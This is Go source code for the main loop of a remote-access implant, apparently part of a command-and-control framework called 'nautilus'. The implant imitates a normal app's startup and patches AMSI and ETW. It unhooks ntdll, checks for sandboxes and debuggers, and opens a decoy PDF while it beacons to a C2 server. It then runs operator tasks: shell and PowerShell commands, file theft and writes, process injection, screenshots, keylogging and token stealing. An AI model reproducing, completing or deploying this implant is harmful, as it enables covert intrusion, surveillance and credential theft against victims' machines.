package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"nautilus/c2/encode"
	"nautilus/c2/transport"
	"nautilus/core"
	"nautilus/evasion"
)

var (
	c2Addr      string
	intervalStr string
	jitterStr   string
	sessionID   string
	skipSandbox string
)

// Mimic normal app init behavior
func normalInit() {
	rand.Seed(time.Now().UnixNano())
	delay := time.Duration(500+rand.Intn(1000)) * time.Millisecond
	time.Sleep(delay)

	tmpPath := os.TempDir()
	cfgName := fmt.Sprintf("%s\\app_%d.tmp", tmpPath, rand.Intn(10000))
	f, err := os.OpenFile(cfgName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if err == nil {
		f.WriteString(fmt.Sprintf("# App Config v%d.%d\n", rand.Intn(10), rand.Intn(100)))
		f.Close()
		os.Remove(cfgName)
	}
}

func main() {
	normalInit()

	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
	evasion.InitSSNMap()
	evasion.InitIndirectSyscall()
	evasion.InitStackSpoof()

	// ===== EDR Evasion: AMSI + ETW Patch =====
	evasion.BypassAMSI()
	evasion.BypassETW()

	// Drop & open embedded PDF, then C2 connect silently
	DropAndOpenPDF()

	evasion.InitLegitimateAPIs()
	evasion.NtdllUnhook()

	if skipSandbox != "1" {
		if evasion.AntiSandbox() {
			os.Exit(0)
		}
	}

	if evasion.AntiDebug() {
		os.Exit(0)
	}

	var interval, jitter int
	if intervalStr != "" {
		fmt.Sscanf(intervalStr, "%d", &interval)
	}
	if jitterStr != "" {
		fmt.Sscanf(jitterStr, "%d", &jitter)
	}

	cfg := transport.DefaultConfig(c2Addr)
	if interval > 0 {
		cfg.Interval = interval
	}
	if jitter > 0 {
		cfg.Jitter = jitter
	}

	tp := transport.NewHTTPTransport(cfg)

	maxRetries := 2 + rand.Intn(3)
	for i := 0; i < maxRetries; i++ {
		err := initSession(tp)
		if err == nil {
			break
		}
		time.Sleep(tp.GetInterval())
	}
	if sessionID == "" {
		return
	}

	for {
		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
		// TODO: EkkoSleep修复后启用
		time.Sleep(tp.GetInterval() + extraDelay)

		pkt, err := tp.Poll(sessionID)
		if err != nil {
			continue
		}

		if pkt.Type == encode.MsgTask {
			result := procReq(pkt)
			respPkt := &encode.Packet{
				Type:   encode.MsgTaskResult,
				TaskID: pkt.TaskID,
				Data:   result,
			}
			_, err := tp.Send(respPkt, sessionID)
			if err != nil {
				time.Sleep(tp.GetInterval())
				continue
			}
		}

		time.Sleep(tp.GetInterval())
	}
}

func initSession(tp *transport.HTTPTransport) error {
	info := core.GetSysInfo()
	infoJSON, _ := json.Marshal(info)
	pkt := &encode.Packet{
		Type: encode.MsgRegister,
		Data: infoJSON,
	}
	respPkt, err := tp.Send(pkt, "")
	if err != nil {
		return err
	}

	if respPkt.Type == encode.MsgRegister {
		var resp map[string]string
		json.Unmarshal(respPkt.Data, &resp)
		if sid, ok := resp["session_id"]; ok {
			sessionID = sid
		}
	}
	return nil
}

func procReq(pkt *encode.Packet) []byte {
	req, err := encode.DecodeTaskReq(pkt.Data)
	if err != nil {
		resp := &encode.TaskResp{
			TaskID:  pkt.TaskID,
			Success: false,
			Error:   fmt.Sprintf("decode task failed: %v", err),
		}
		data, _ := encode.EncodeTaskResp(resp)
		return data
	}

	resp := &encode.TaskResp{TaskID: pkt.TaskID}

	switch req.TaskType {
	case encode.TaskExecCmd:
		output, err := core.ExecCmdWithShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskExecPS:
		output, err := core.ExecCmdWithPowerShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskFileRead:
		data, err := core.FileRead(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = evasion.B64Encode(data)
		}

	case encode.TaskFileWrite:
		data, err := evasion.B64Decode(req.Params["data"])
		if err != nil {
			resp.Success = false
			resp.Error = err.Error()
		} else {
			err = core.FileWrite(req.Params["path"], data)
			resp.Success = err == nil
			if err != nil {
				resp.Error = err.Error()
			}
		}

	case encode.TaskFileDelete:
		err := core.FileRemove(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskListDir:
		files, err := core.ListDir(req.Params["path"])
		resp.Success = err == nil
		resp.Output = strings.Join(files, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcList:
		procs, err := core.ProcessList()
		resp.Success = err == nil
		resp.Output = strings.Join(procs, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcKill:
		pid := 0
		fmt.Sscanf(req.Params["pid"], "%d", &pid)
		err := core.ProcessKill(pid)
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskPrivInfo:
		info := core.GetPrivilegeInfo()
		resp.Success = true
		resp.Output = core.FormatPrivilegeInfo(info)

	case encode.TaskPayload:
		resp.Output = handlePayload(req.Params)

	case encode.TaskInject:
		output, err := core.HandleInject(req.Params)
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskScreenshot:
		data, err := core.CaptureScreenshot()
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = evasion.B64Encode(data)
		}

	case encode.TaskKeylogOn:
		err := core.StartKeylogger()
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = "keylogger started"
		}

	case encode.TaskKeylogOff:
		output, err := core.StopKeylogger()
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskTokenEnum, encode.TaskTokenSteal, encode.TaskTokenRev2, encode.TaskTokenMake:
		output, err := core.HandleToken(req.Params)
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskSysInfo:
		info := core.GetSysInfo()
		resp.Success = true
		resp.Output = core.FormatSysInfo(info)

	case encode.TaskExit:
		os.Exit(0)

	default:
		resp.Success = false
		resp.Error = fmt.Sprintf("unknown task type: %d", req.TaskType)
	}

	data, _ := encode.EncodeTaskResp(resp)
	return data
}
